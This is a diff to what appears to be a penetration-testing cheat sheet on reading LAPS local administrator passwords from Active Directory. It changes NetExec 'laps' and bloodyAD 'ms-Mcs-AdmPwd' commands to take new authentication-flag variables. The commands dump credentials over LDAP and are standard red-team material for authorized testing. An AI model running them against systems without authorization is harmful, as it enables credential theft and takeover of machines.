@@ -7,12 +7,12 @@ Local Administrator Password Solution stores per-machine local admin passwords i
 NetExec's `laps` module reads the LAPS attribute over LDAP and prints recovered passwords for every computer the user can read. Fast first check.
 
 ```sh title:"NetExec LAPS reader - dumps all readable LAPS passwords"
-nxc ldap $domain -u $user -p $pass -M laps
+nxc ldap $domain -u $user $auth_flags -M laps
 ```
 <!-- cheat
 import domain_ip
-var user
-var pass
+import users
+import nxc_auth
 -->
 
 ### LAPSToolkit list computers
@@ -82,13 +82,13 @@ var rhost_name
 Read the LAPS password attribute over LDAP from Linux via bloodyAD.
 
 ```sh title:"Read ms-Mcs-AdmPwd over LDAP via bloodyAD"
-bloodyAD --host $rhost_name -d $domain -u $user -p $pass get object $target_computer --attr ms-Mcs-AdmPwd
+bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_computer --attr ms-Mcs-AdmPwd
 ```
 <!-- cheat
 import domain_ip
+import users
+import bloody_auth
 var rhost_name
-var user
-var pass
 var target_computer
 -->
 
